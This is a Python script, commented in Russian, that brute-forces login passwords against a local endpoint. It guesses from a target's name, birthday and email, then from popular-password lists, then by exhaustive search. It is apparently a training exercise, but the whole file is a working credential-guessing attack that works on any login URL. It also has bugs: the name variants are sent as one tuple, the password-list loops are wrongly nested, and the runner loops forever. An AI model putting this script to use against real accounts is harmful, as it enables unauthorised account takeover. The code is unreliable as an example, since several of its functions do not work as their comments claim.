import requests

#   Settings
# _________________________________________________________________
name = input('Введите имя: ')
second_name = input('Введите фамилию: ')
birthday = input('Введите дату рождения: ')
email = input('Введите e-mail: ')
brute_url = 'http://127.0.0.1:5000/auth'

with open('1Kpass.txt') as f:  # База тысячи самых популярных паролей
    KKpasswords = f.read().split('\n')

with open('1KKpass.txt') as k:  # База миллиона самых популярных паролей
    Kpasswords = k.read().split('\n')

alphabet: str = '0123456789dog'  # Продолжать алфавит не будем для увеличения скорости тестирования


# __________________________________________________________________

# функция подбора пароля из баз популярных паролей
def brut_from_base(login):
    # Сначала брутим пароль из самых популярных 1000 паролей
    for password in Kpasswords:
        response = requests.post(brute_url, json={"login": login, "password": password})
        if response.status_code == 200:
            return f' пароль для {login} подобран - {password}'
        else:
            # Брутим из базы миллиона популярных паролей
            for password in KKpasswords:
                response = requests.post(brute_url, json={"login": login, "password": password})
                if response.status_code == 200:
                    return f' пароль для {login} подобран - {password}'


# функция подбора пароля, если вдруг это дата рождения
def brute_by_birthday(login):
    response = requests.post(brute_url, json={"login": login, "password": birthday})
    if response.status_code == 200:
        return f' пароль для {login} подобран - {birthday}'


# функция подбора пароля по различным комбинациям имени и фамилии. например "n.levashov"
def brut_by_name_and_lastname(login):
    name_password = (
        name,
        second_name + name,
        name + second_name,
        name[0] + str('.') + second_name
    )
    response = requests.post(brute_url, json={"login": login, "password": name_password})
    if response.status_code == 200:
        return f' пароль для {login} подобран - {name_password}'

# функция подбора пароля по заданной почте (отсекаем @ и всё, что дальше)
def brute_by_email(login):
    email_password = (email.split('@')[0])
    response = requests.post(brute_url, json={"login": login, "password": email_password})
    if response.status_code == 200:
        return f' пароль для {login} подобран - {email_password}'

# вариация пароля из почты + даты рождения
    email_password = (email.split('@')[0]) + birthday
    response = requests.post(brute_url, json={"login": login, "password": email_password})
    if response.status_code == 200:
        return f' пароль для {login} подобран - {email_password}'

# часто используют вариации с цифрами, например artem777
    for p in range(1000):
        email_password += str(p)
        response = requests.post(brute_url, json={"login": login, "password": email_password})
        if response.status_code == 200:
            return f' пароль для {login} подобран - {email_password}'


# функция "математического" брута, используя алфавит
def brute_by_math(login):
    base = len(alphabet)
    i = 0
    length = 0
    while True:
        password = ''
        temp = i
        while temp != 0:
            rest = temp % base
            temp = temp // base
            password = alphabet[rest] + password

        password = '0' * (length - len(password)) + password
        response = requests.post(brute_url,
                                 json={'login': login, 'password': password})
        if response.status_code == 200:
            return f' пароль для {login} подобран - {password}'

        if password == length * alphabet[-1]:
            length += 1
            i = 0
        else:
            i += 1

# функция запуска быстрого подбора паролей (зная имя, почту и т.д.)
# именно здесь определяется порядок подбора паролей, при необходимости можно менять
def runner_bruteforsers(logins):
    while True:
        succes = brut_by_name_and_lastname(logins)
        if succes != None:
            return succes

        succes = brute_by_birthday(logins)
        if succes != None:
            return succes

        succes = brute_by_email(logins)
        if succes != None:
            return succes

        succes = brut_from_base(logins)
        if succes != None:
            return succes
# функция запуска "математического" брутфорса
def long_runner_bruteforsers(logins):
    succes = brute_by_math(logins)
    if succes != None:
        return succes